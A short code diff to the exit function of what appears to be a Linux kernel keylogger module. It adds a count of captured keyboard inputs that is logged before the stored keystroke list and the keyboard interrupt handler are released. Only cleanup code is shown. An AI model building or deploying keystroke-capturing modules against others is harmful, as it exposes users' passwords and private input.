@@ -56,10 +56,14 @@ static void __exit m_exit(void) {
     struct linked_list_node *ptr, *tmp;
 
     misc_deregister(&device);
+    size_t len = 0;
+
     list_for_each_entry_safe(ptr, tmp, &keyboard_log, list){
+        len++;
         list_del(&ptr->list);
         kfree(ptr);
     }
+    printk(KERN_INFO "Captured %zu Keyboard inputs", len);
     free_irq(1,&key_logger);
     mutex_destroy(&lock);
 	printk(KERN_INFO "Drivers and Interrupts (exit)\n");
